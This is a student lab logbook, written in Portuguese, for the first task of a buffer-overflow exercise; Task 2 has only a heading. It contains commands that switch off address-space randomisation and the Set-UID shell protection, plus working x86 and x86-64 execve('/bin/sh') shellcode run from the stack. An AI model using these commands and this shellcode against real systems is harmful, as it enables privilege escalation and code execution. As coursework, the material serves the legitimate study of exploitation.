# LOGBOOK5 - Buffer Overflow

## Setup

Antes de iniciarmos o guião da semana 5, devemos desligar algumas proteções do sistema operativo (para nos facilitar), tais como a randomização do espaço de endereços e a proibição ao nível da shell de ser executada por processos com Set-UID.

```
sudo sysctl -w kernel.randomize_va_space=0
sudo ln -sf /bin/zsh /bin/sh
```
## Task 1

Primeiramente, executamos o seguinte código :

```
#include <stdio.h>
int main(){
	char*name[2];
	name[0] = "/bin/sh";
	name[1] = NULL;
	execve(name[0], name, NULL);
}
```

Reparamos que abriu uma shell na mesma pasta onde foi executado o programa.

Depois executamos o call_shellcode.c:
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char shellcode[] =
#if __x86_64__"\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e""\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57""\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f""\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31""\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif;
int main(int argc, char**argv){
    char code[500];strcpy(code, shellcode); // Copy the shellcode to the stack
    int (*func)() = (int(*)())code;
    func();                 // Invoke the shellcode from the stack
    return 1;
}
```

Ao executar este ficheiro usando o `make`, reparamos que é criado 2 ficheiros `a32.out a64.out`. Quando executamos qualquer um deles, reparamos que é aberto um shell.

## Task 2



